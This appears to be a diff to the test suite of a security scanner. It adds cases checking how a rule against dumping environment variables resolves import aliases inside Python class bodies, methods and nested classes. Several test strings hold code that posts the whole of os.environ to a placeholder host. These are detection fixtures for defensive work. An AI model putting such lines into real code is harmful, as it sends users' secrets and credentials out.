@@ -1338,6 +1338,17 @@ def test_python_relative_import_over_a_module_alias_drops_it(tmp_path: Path, reb
         ),
         # ...and a `global` relative import replaces the module-level alias, not a local it never had.
         ("import os\nimport requests as client\n\ndef initialize():\n    global client\n    from .helpers import client\n\ninitialize()\nclient.post(endpoint, json=dict(os.environ))\n", False),
+        # A class body is visible to itself, so a call there reads its own import...
+        ("import os\n\nclass C:\n    import requests as client\n    client.post(host, json=dict(os.environ))\n", True),
+        # ...but a method skips the class namespace, so the same name there is unbound and the
+        # call can only raise. The flat map read it as `requests.post` and blocked a file that
+        # cannot run; so did a nested class, which skips the enclosing class the same way.
+        ("import os\n\nclass C:\n    import requests as client\n\n    def send(self):\n        client.post(host, json=dict(os.environ))\n\nC().send()\n", False),
+        ("import os\n\nclass A:\n    import requests as client\n\n    class B:\n        client.post(host, json=dict(os.environ))\n", False),
+        # Skipping the class must not skip what lies beyond it: module and enclosing-function
+        # imports stay visible inside a method.
+        ("import os\nimport requests as client\n\nclass C:\n    def send(self):\n        client.post(host, json=dict(os.environ))\n\nC().send()\n", True),
+        ("import os\n\ndef make():\n    import requests as client\n\n    class C:\n        def send(self):\n            client.post(host, json=dict(os.environ))\n\n    C().send()\n\nmake()\n", True),
     ],
 )
 def test_python_nested_imports_shadow_only_within_their_own_scope(tmp_path: Path, source: str, blocks: bool) -> None:
@@ -1351,6 +1362,19 @@ def test_python_nested_imports_shadow_only_within_their_own_scope(tmp_path: Path
 
     assert result["blocked"] is blocks
     assert any(finding["rule_id"] == "python-env-dump-exfil" for finding in result["findings"]) is blocks
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "import os\n\nclass C:\n    import requests as client\n\n    def send(self):\n        client.post(host, json=dict(os.environ))\n\nC().send()\n",
+        "import os\n\nclass A:\n    import requests as client\n\n    class B:\n        client.post(host, json=dict(os.environ))\n",
+    ],
+)
+def test_python_class_body_import_is_unbound_where_the_scanner_now_says_so(source: str) -> None:
+    """The runtime agrees with the scoped model: the class-body name is unbound from a method or nested class."""
+    with pytest.raises(NameError, match="client"):
+        _runtime_client_receivers(source, raise_errors=True)
 
 
 def test_python_relative_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
@@ -1627,6 +1651,24 @@ def test_python_import_aliases_honor_global_and_nonlocal_declarations() -> None:
     assert scopes.resolved(inner) == {"client": "urllib3", "other": "aiohttp"}
     assert scopes.resolved(reader) == {"other": "aiohttp"}
     assert scopes.resolved(fresh) == {"other": "aiohttp"}
+
+
+def test_python_import_aliases_bound_in_a_class_body_are_visible_only_there() -> None:
+    """A class body is a scope for itself alone: methods and nested classes skip it, as the runtime does.
+
+    A name bound only by a class-body import can only raise `NameError` from a method, so proving
+    a sink through it would hard-block a file that cannot run. The class body itself still sees
+    its own import, and an enclosing function's import stays visible through the class.
+    """
+    tree = ast.parse("def make():\n    import json as outer\n    class A:\n        import requests as client\n        class B:\n            pass\n        def send(self):\n            pass\n")
+    scopes = _collect_python_aliases(tree)
+    make = tree.body[0]
+    class_a = make.body[1]
+    class_b, send = class_a.body[1], class_a.body[2]
+
+    assert scopes.resolved(class_a) == {"client": "requests", "outer": "json"}
+    assert scopes.resolved(send) == {"outer": "json"}
+    assert scopes.resolved(class_b) == {"outer": "json"}
 
 
 @pytest.mark.parametrize(
